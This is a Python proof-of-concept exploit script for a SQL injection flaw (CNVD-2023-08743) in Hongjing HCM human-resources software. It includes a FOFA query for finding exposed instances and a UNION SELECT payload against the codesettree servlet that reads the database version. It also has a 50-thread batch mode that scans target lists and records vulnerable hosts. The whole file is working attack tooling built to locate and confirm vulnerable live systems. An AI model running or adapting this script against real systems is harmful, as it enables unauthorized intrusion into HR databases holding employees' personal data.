# 宏景HCM SQL注入漏洞 (CNVD-2023-08743)
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa语句
# body='<div class="hj-hy-all-one-logo"' && title="人力资源信息管理系统"

def banner():
    test = """
██╗  ██╗ ██████╗███╗   ███╗      ███████╗ ██████╗ ██╗     
██║  ██║██╔════╝████╗ ████║      ██╔════╝██╔═══██╗██║     
███████║██║     ██╔████╔██║█████╗███████╗██║   ██║██║     
██╔══██║██║     ██║╚██╔╝██║╚════╝╚════██║██║▄▄ ██║██║     
██║  ██║╚██████╗██║ ╚═╝ ██║      ███████║╚██████╔╝███████╗
╚═╝  ╚═╝ ╚═════╝╚═╝     ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝
"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='宏景HCM SQL注入漏洞 (CNVD-2023-08743)POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&codesetid=1&flag=c&parentid=-1&status=1"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }
    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and 'SQL Server' in response.text:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()